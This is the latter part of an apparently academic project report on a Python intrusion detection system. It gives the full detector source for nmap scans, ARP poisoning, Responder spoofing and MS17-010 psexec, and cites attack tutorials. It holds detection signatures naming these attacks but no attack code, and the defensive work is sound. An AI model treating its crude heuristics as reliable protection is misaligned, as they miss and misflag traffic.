
![ms17_010_psexec Detection](img/ms17_psexec/Catching_exploit.png)

![ms17_010_psexec Successful](img/ms17_psexec/Catching_wireshark.png)

# Recommendations

The most important recommendation for our framework is regarding efficiency for our IDS.
Currently we use a multiprocessing module to run all the detectors at the same time.
We decided on this route because each detector sets up its own sniffer and iterators through the packets.
If you were to call each detector without multiprocessing only the first detector would run as they run forever.
However, running each detector as its own process allows them to run at the same time.
This is not the most efficient way though.
Each detector does not need its own sniffer, only one sniffer is truly needed with packets being sent to each detector.
A quick mockup of a changed to increase efficiency is below
In this implementation each detection would instead of creating a new sniffer and looping through each packet internally would take in a packet and determine whether or not it is malicious.

```python

if len(sys.argv) > 1:
    interface = sys.argv[1]
else:
    interface = sniffer.choose_interface()
clear()
kwargs={'interface': interface, 'continuous': True}
packets = sniffer.get_capture(**kwargs)

for packet in packets:
        ids_nmap.xmas_signature_detection(packet)
        ids_nmap.ack_heuristic_detection(packet)
        ids_nmap.syn_heuristic_detection(packet)
        ids_ettercap.heuristic_detection(packet)
        ids_ettercap.behavioral_detection(packet)
        ids_responder.behavioral_detection(packet)
```

Currently our system only flags potentially malicious events.
It would be beneficial if the framework could be configured to actually act when it detects malicious traffic.
Such as activating firewall rules to ignore certain IPs if it detects that it is being scanned.

Another recommendation would be to add a better way of adding new detectors.
Currently we manually add them to be called as a new process.
If we developed a plugin architecture to instead just look at which detectors, or "plugins" are in `src/` and load them automatically it would be much more developer friendly.
This could allow third party plugins to be added without modifying the IDS source code.

Adding an ability to tell the IDS which detectors to run would also be beneficial.
Currently we automatically run all the detectors programmed.
However, some networks may not have a Windows Domain controller and may not have a need to run a Responder detector.
An implementation for this could be a configuration file that is passed via the command line to say which detectors to run
If a configuration file is not passed the program could prompt the user to choose which detectors.
A third option would be to allow a flag to be set either in the command line or the configuration file to just run all detectors.

Building off of the configurations file concept it may be beneficial for some hard coded values such as the domain controller IP or number of unique ports to be passed in the configuration file as well. An example is listed below

Ctrl-C breaks

```json
{
    "detectors": [
        {
            "title": "nmap-ack",
            "active": true,
            "args": ["uniq_ports 80"],
        },
        {
            "title": "nmap-syn",
            "active": false,
        },
        {
            "title": "nmap-xmas",
            "active": true,
        },
        {
            "title": "ettercap",
            "active": true,
        },
        {
            "title": "responder",
            "active": true,
            "args": ["domain_ip 192.168.4.20"],
        },
        {
            "title": "ms17_psexec",
            "active": false,
        },
    ]
}
```

Currently we do not have many options that can be switched via the command line but it is trivial to add with Python's argparse.
Additionally when we detect that there is a malicious event we only print the event to standard output.
It would be better if we logged all events to a log file and have an option to run the IDS in verbose mode and have it print any malicious events to standard out as well.
Adding the time the event occurred as well as the IP which sent it would be helpful as well, since right now it is just the packet number.

# Conclusion

Intrusion Detection Systems provide a valuable and vital service to security professionals, corporations, and consumers.
Successful implementation of such a system into your network can help detect attacks and help prevent would-be
attackers from entering a network, in turn protecting sensitive or expensive data and resources.

Building this IDS system provided the opportunity to learn about some of of the common attacks one might see while sitting on a network, detect red flags when examining traffic on a network under attack, and automate or craft tools with networking and security capabilities.
Each of these opportunities is invaluable when considering entering the information security workforce.

# Source Code

You will find below the raw source code of the framework.

## I. Sniffer Code

```python
"""
Module to sniff packets from a local interface for a
certain period of time.

Can also read in pre-existing captures and dump the
captures to standard output.

Author: Jordan Sosnowski
Date: 11/22/2019
"""
import os
try:
    import winreg as wr
except ImportError:
    pass
import pyshark
import netifaces


def choose_interface():
    """
    Allows user to select interface based
    on system interfaces
    """
    interfaces = netifaces.interfaces()

    if os.name == 'nt':
        # allows windows machines to choose interfaces
        iface_names = ['(unknown)' for i in range(len(interfaces))]
        reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
        reg_key = wr.OpenKey(
            reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
        for counter, interface in enumerate(interfaces):
            try:
                reg_subkey = wr.OpenKey(
                    reg_key, interface + r'\Connection')

                iface_names[counter] = wr.QueryValueEx(reg_subkey, 'Name')[0]
            except FileNotFoundError:
                pass
        interfaces = iface_names

    print('Select Interface: ')

    for val, count in enumerate(interfaces):
        print(val, count)

    selection = int(input())

    return interfaces[selection]


def _sniff(interface=None, timeout=10, continuous=True, out_file=None):
    """
    Sniffs packet on specified interface, either for a
    specified number of seconds or forever.

    If interface is not specified local interface will
    be listed. If an outfile is provided the function
    will save the packet file.

    args:
        interface (str): represents interface to listen on
            defaults -> en0

        timeout (int): represents the time to record packets for
            defaults -> 10

        continuous (boolean): represents whether or not to capture
        in continuous mode or to sniff for a certain number of packets

        out_file (str): represents the file to output saved
        captures to
            defaults -> None

    returns:
        capture object
    """
    if not interface:
        interface = choose_interface()

    # if out_file is provided, output capture
    if out_file:
        capture = pyshark.LiveCapture(output_file=out_file,
                                      interface=interface)
    else:
        capture = pyshark.LiveCapture(interface=interface)

    # if continuous sniff continuously, other sniff for timeout
    if continuous:
        capture.sniff_continuously()
    else:
        capture.sniff(timeout=timeout)

    return capture


def _read_cap(in_file):
    """ Reads capture file in and returns capture object """
    cap = pyshark.FileCapture(in_file)
    return cap


def dump_cap(capture):
    """ Dumps capture object's packets to standard output """
    for packet in capture:
        packet.pretty_print()


def get_capture(file=None, **kwargs):
    """
    Controller method for sniffer

    If file is none, assume user wanted to sniff traffic rather
    than use a file capture
    """
    if file:
        capture = _read_cap(file)
    else:
        capture = _sniff(**kwargs)
    return capture

```

## II. IDS Code

```python
"""
Main IDS Driver

Authors: Jordan Sosnowski, Charles Harper, 
John David Watts, and Tyler McGlawn

Date: Dec 6, 2019
"""
import sys
import multiprocessing
import os
import sniffer
import ids_nmap
import ids_ettercap
import ids_responder
import ids_ms17_010_psexec


def clear():

    # for windows
    if os.name == 'nt':
        _ = os.system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = os.system('clear')


def main():
    """
    Main driver for the IDS

    Uses multiprocessing to run each detection algorithm

    """
    if len(sys.argv) > 1:
        interface = sys.argv[1]
    else:
        interface = sniffer.choose_interface()
    clear()
    print('Sniffing...')

    xmas = multiprocessing.Process(
        target=ids_nmap.xmas_signature_detection, kwargs={'interface': interface, 'continuous': True})
    ack = multiprocessing.Process(
        target=ids_nmap.ack_heuristic_detection, kwargs={'interface': interface, 'continuous': True})
    syn = multiprocessing.Process(
        target=ids_nmap.syn_heuristic_detection, kwargs={'interface': interface, 'continuous': True})
    ettercap_1 = multiprocessing.Process(
        target=ids_ettercap.heuristic_detection, kwargs={'interface': interface, 'continuous': True})
    ettercap_2 = multiprocessing.Process(
        target=ids_ettercap.behavioral_detection, kwargs={'interface': interface, 'continuous': True})
    responder = multiprocessing.Process(
        target=ids_responder.behavioral_detection, kwargs={'interface': interface, 'continuous': True})
    ms17_010_psexec = multiprocessing.Process(
        target=ids_ms17_010_psexec.signature_detection, kwargs={'interface': interface, 'continuous': True})

    # starting individual threads
    xmas.start()
    ack.start()
    syn.start()
    ettercap_1.start()
    ettercap_2.start()
    responder.start()
    ms17_010_psexec.start()

    # wait until threads complete
    xmas.join()
    ack.join()
    syn.join()
    ettercap_1.join()
    ettercap_2.join()
    responder.join()
    ms17_010_psexec.join()
    print("Done!")


main()
```

## III. NMAP IDS Code

```python
"""
An IDS system for detecting nmap xmas attacks, ack attacks, and syn attacks

Author: Jordan Sosnowski
Date: Nov 26 2019

"""

import collections
import sniffer


MAX_UNIQUE_PORTS = 10


def xmas_signature_detection(file=None, **kwargs):
    """
    xmas detection function

    uses the signature of TCP Flag == 0x29
    """
    capture = sniffer.get_capture(file, **kwargs)
    detected = False

    for packet in capture:
        # ensure packet is TCP as xmas attacks run over TCP
        if packet.transport_layer == 'TCP':
            # ensure that the only flags set are the push, urgent, and final flags
            # usually those flags should not be set, and if they are its probably
            # an xmas attack
            if int(packet.tcp.flags, 16) == 41:  # '0x00000029'
                print(f'XMAS ATTACK in packet number: {packet.number}')
                detected = True
    return detected


def ack_heuristic_detection(file=None, **kwargs):
    """
    ack detection function

    uses the heuristic of uniq ports > MAX_UNIQUE_PORTS and if
    TCP flag == 0x10
    """
    capture = sniffer.get_capture(file, **kwargs)
    uniq_ip = collections.defaultdict(set)
    detected = False

    for packet in capture:
        # ensure packet is using TCP as ack attacks run over TCP
        if packet.transport_layer == 'TCP':
            # ensure packet is only setting the ACK flag
            if int(packet.tcp.flags, 16) == 16:  # 0x10
                uniq_ip[packet.ip.addr].add(packet.tcp.dstport)

                # if the number of unique dst ports are more then MAX_UNIQUE_PORTS flag it
                if len(uniq_ip[packet.ip.addr]) > MAX_UNIQUE_PORTS:
                    print(f'ACK ATTACK in packet number: {packet.number}')
                    detected = True

    return detected


def syn_heuristic_detection(file=None, **kwargs):
    """
    syn detection function

    uses the heuristic of uniq ports > MAX_UNIQUE_PORTS and if
    TCP flag == 0x2
    """
    capture = sniffer.get_capture(file, **kwargs)
    uniq_ip = collections.defaultdict(set)
    detected = False

    for packet in capture:
        # ensure packet is using TCP as syn attacks run over TCP
        if packet.transport_layer == 'TCP':
            # ensure packet is only setting the SYN flag
            if int(packet.tcp.flags, 16) == 2:
                uniq_ip[packet.ip.addr].add(packet.tcp.dstport)

                # if the number of unique dst ports are more than MAX_UNIQUE_PORTS flag it
                if len(uniq_ip[packet.ip.addr]) > MAX_UNIQUE_PORTS:
                    print(f'SYN ATTACK in packet number: {packet.number}')
                    detected = True

    return detected
```

## IV. Ettercap IDS Code

```python
"""
Ettercap detection module

Author: Charles Harper
Date: Nov 12, 2019
"""

import sniffer

CONCURRENT_ARP_REPLY_THRESHOLD = 4
ARP_REQ_THRESHOLD = 30

def heuristic_detection(file=None, **kwargs):
    """
    ARP Poisoning host discovery detection function

    Observes ARP traffic, looking for an abnormal number of concurrent ARP requests. 
    Given a specific threshold defined as "CONCURRENT_ARP_REPLY_THRESHOLD", this function 
    counts the number concurrent ARP requests and compares it to the threshold. If the
    count exceeds the threshold, each following ARP request from the sender is flagged
    as an ARP Poisoning packet and a warning is issued and returned to the ids system.
    """
    capture = sniffer.get_capture(file, **kwargs)
    was_detected = False
    host_in_question = ""
    concurrent_arp_req_count = 0
    request = '1'
    reply = '2'

    for packet in capture:
        if 'arp' in packet: #if it is an ARP packet
            if packet.arp.opcode == request:  # if the arp packet is an arp request
                if host_in_question == "":
                    host_in_question = packet.eth.src  # set first MAC SRC address for ARP messages
                elif host_in_question == packet.eth.src:  # if the current mac equals the previous mac
                    concurrent_arp_req_count += 1
                else:
                    host_in_question = packet.eth.src
                    concurrent_arp_req_count = 0
                # if the number of concurrent arp_requests with the same src exceeds our threshold there's a problem
                if concurrent_arp_req_count >= ARP_REQ_THRESHOLD:
                    print("ARP POISONING DETECTED!!! FLAGGED PACKET:", packet.number)
                    was_detected = True
    return was_detected


def behavioral_detection(file=None, **kwargs):
    """
    Gratuitous ARP detection function

    Observes the behavior of the ARP traffic on the network, and flags packets contributing to an abnormal 
    ARP reply to ARP request ratio.
    """
    capture = sniffer.get_capture(file, **kwargs)
    was_detected = False
    previous_arp_type = None
    current_arp_type = None
    concurrent_arp_reply_count = 0
    request = '1'
    reply = '2'

    for packet in capture:
        if 'arp' in packet:
            current_arp_type = packet.arp.opcode
            if current_arp_type == reply:  # if current ARP message is a reply
                if previous_arp_type == request: # if the previous ARP message was a request
                    # clear the previous message and move on
                    previous_arp_type = current_arp_type
                    concurrent_arp_reply_count = 0
                else: # if the previous ARP was a reply
                    concurrent_arp_reply_count += 1
                    if concurrent_arp_reply_count > CONCURRENT_ARP_REPLY_THRESHOLD: # when the number of concurrent replies reaches Threshold
                        print(
                            "GRATUITOUS ARP DETECTED!!! FLAGGED PACKET:", packet.number)
                        was_detected = True
            else:  # if current ARP message it is a request
                previous_arp_type = request
    return was_detected

```

## V. Responder IDS Code

```python
"""
An IDS system for detecting responder attacks

Author: John David Watts
Date: December 12 2019
"""

import sniffer


DOMAIN_IP = '192.168.150.201'  # should change per network


def behavioral_detection(file=None, **kwargs):
    """
    function to detect responders spoofing attacks

    assumes that only one IP is acting as the domain controller and
    assume as an admin you know the IP
    """
    capture = sniffer.get_capture(file, **kwargs)
    detected = False

    for packet in capture:
        # ensure packet is either an 'NBNS' or 'LLMNR'
        # as responder attacks run through these protocols
        try:
            if ('nbns' in packet or 'llmnr' in packet) and packet.ip.src != DOMAIN_IP:
                print(
                    f'Responder ATTACK detected in packet number: {packet.number}')
                detected = True
        except AttributeError:
            # some LLMNR packets are transmitted via link layer and not the internet layer
            # meaning they only have MAC addresses and not IP
            pass
    return detected

```

## VI. ms17_010_psexec IDS Code

```python
import sniffer

"""
An IDS system for detecting ms17_010_psexec

Author: Matthew McGlawn
Date: Dec 7 2019
"""

def signature_detection(file=None, **kwargs):

    """
    ms17_010_psexec detection function

    Uses the detection of monitoring if a packet contains SMB files and is looking to access the path to the ICP$ or ADMIN$ shares.
    """

    capture = sniffer.get_capture(file, **kwargs)
    for packet in capture:
        if('SMB' in packet):
            smb = packet.smb
            if("path" in dir(smb)):
                path = smb.path
                if(("IPC$" in path) or ("ADMIN$" in path)):
                    print("MS_010_psexec detected in packet:" + str(packet.number))

```

# References

1: <https://stackoverflow.com/questions/1769403/what-is-the-purpose-and-use-of-kwargs>

2: <https://nmap.org/book/man-port-scanning-techniques.html>

3: <https://pentestmag.com/ettercap-tutorial-for-windows/>

4: <https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/>

5: <https://tools.kali.org/sniffingspoofing/responder>

6: <https://forums.kali.org/showthread.php?36036-Penetration-Testing-How-to-use-Responder-py-to-Steal-Credentials>

7: <https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/>

8: <https://null-byte.wonderhowto.com/how-to/use-ettercap-intercept-passwords-with-arp-spoofing-0191191/>

9: <https://linux.die.net/man/8/ettercap>

10: <https://linux.die.net/man/1/nmap>

11: <https://en.wikipedia.org/wiki/Heuristic_analysis>

12: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Signature-based>

13: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Anomaly-based>

14: <https://en.wikipedia.org/wiki/Intrusion_detection_system>

15: <https://whatis.techtarget.com/definition/behavior-based-security>

16: <https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution>

17: <https://en.wikipedia.org/wiki/NetBIOS#Name_service>

18: <https://github.com/lgandx/Responder>

19: <https://en.wikipedia.org/wiki/NetBIOS>

20: <https://en.wikipedia.org/wiki/Metasploit_Project>

21: <https://tools.ietf.org/html/rfc793>

22: <https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/>

23: <https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html>

24: <https://www.varonis.com/blog/what-is-metasploit/>

25: <https://metasploit.help.rapid7.com/docs>

26: <https://github.com/iagox86/metasploit-framework-webexec/blob/master/documentation/modules/exploit/windows/smb/ms17_010_psexec.md>

27: <https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec>

28: <https://www.cyber.nj.gov/alerts-and-advisories/20180209/eternalchampion-eternalromance-and-eternalsynergy-modified-to-exploit-all-windows-versions-since-windows-2000>

29: <https://www.fireeye.com/blog/threat-research/2017/05/smb-exploited-wannacry-use-of-eternalblue.html>

30: <https://blog.rapid7.com/2013/03/09/psexec-demystified/>

31: <https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>

32: <https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof->

33: <https://en.wikipedia.org/wiki/Service_Control_Manager>

34: <https://en.wikipedia.org/wiki/DCE/RPC>

35: <https://richardkok.wordpress.com/2011/02/03/wireshark-determining-a-smb-and-ntlm-version-in-a-windows-environment/>

36: <https://en.wikipedia.org/wiki/Administrative_share>

37: <http://www.intelliadmin.com/index.php/2007/10/the-admin-share-explained/>

38: <https://docs.netapp.com/ontap-9/index.jsp?topic=%2Fcom.netapp.doc.cdot-famg-cifs%2FGUID-5B56B12D-219C-4E23-B3F8-1CB1C4F619CE.html>

39: <https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>

40: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143>

41: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144>

42: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145>

43: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0146>

44: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0147>

45: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0148>

46: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Network_intrusion_detection_systems>

47: <https://en.wikipedia.org/wiki/ARP_spoofing>

[1]: <https://stackoverflow.com/questions/1769403/what-is-the-purpose-and-use-of-kwargs>
[2]: <https://nmap.org/book/man-port-scanning-techniques.html>
[3]: <https://pentestmag.com/ettercap-tutorial-for-windows/>
[4]: <https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/>
[5]: <https://tools.kali.org/sniffingspoofing/responder>
[6]: <https://forums.kali.org/showthread.php?36036-Penetration-Testing-How-to-use-Responder-py-to-Steal-Credentials>
[7]: <https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/>
[8]: <https://null-byte.wonderhowto.com/how-to/use-ettercap-intercept-passwords-with-arp-spoofing-0191191/>
[9]: <https://linux.die.net/man/8/ettercap>
[10]: <https://linux.die.net/man/1/nmap>
[11]: <https://en.wikipedia.org/wiki/Heuristic_analysis>
[12]: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Signature-based>
[13]: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Anomaly-based>
[14]: <https://en.wikipedia.org/wiki/Intrusion_detection_system>
[15]: <https://whatis.techtarget.com/definition/behavior-based-security>
[16]: <https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution>
[17]: <https://en.wikipedia.org/wiki/NetBIOS#Name_service>
[18]: <https://github.com/lgandx/Responder>
[19]: <https://en.wikipedia.org/wiki/NetBIOS>
[20]: <https://en.wikipedia.org/wiki/Metasploit_Project>
[21]: <https://tools.ietf.org/html/rfc793>
[22]: <https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/>
[23]: <https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html>
[24]: <https://www.varonis.com/blog/what-is-metasploit/>
[25]: <https://metasploit.help.rapid7.com/docs>
[26]: <https://github.com/iagox86/metasploit-framework-webexec/blob/master/documentation/modules/exploit/windows/smb/ms17_010_psexec.md>
[27]: <https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec>
[28]: <https://www.cyber.nj.gov/alerts-and-advisories/20180209/eternalchampion-eternalromance-and-eternalsynergy-modified-to-exploit-all-windows-versions-since-windows-2000>
[29]: <https://www.fireeye.com/blog/threat-research/2017/05/smb-exploited-wannacry-use-of-eternalblue.html>
[30]: <https://blog.rapid7.com/2013/03/09/psexec-demystified/>
[31]: <https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>
[32]: <https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof->
[33]: <https://en.wikipedia.org/wiki/Service_Control_Manager>
[34]: <https://en.wikipedia.org/wiki/DCE/RPC>
[35]: <https://richardkok.wordpress.com/2011/02/03/wireshark-determining-a-smb-and-ntlm-version-in-a-windows-environment/>
[36]: <https://en.wikipedia.org/wiki/Administrative_share>
[37]: <http://www.intelliadmin.com/index.php/2007/10/the-admin-share-explained/>
[38]: <https://docs.netapp.com/ontap-9/index.jsp?topic=%2Fcom.netapp.doc.cdot-famg-cifs%2FGUID-5B56B12D-219C-4E23-B3F8-1CB1C4F619CE.html>
[39]: <https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>
[40]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143>
[41]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144>
[42]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145>
[43]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0146>
[44]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0147>
[45]: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0148>
[46]: <https://en.wikipedia.org/wiki/Intrusion_detection_system#Network_intrusion_detection_systems>
[47]: <https://en.wikipedia.org/wiki/ARP_spoofing>
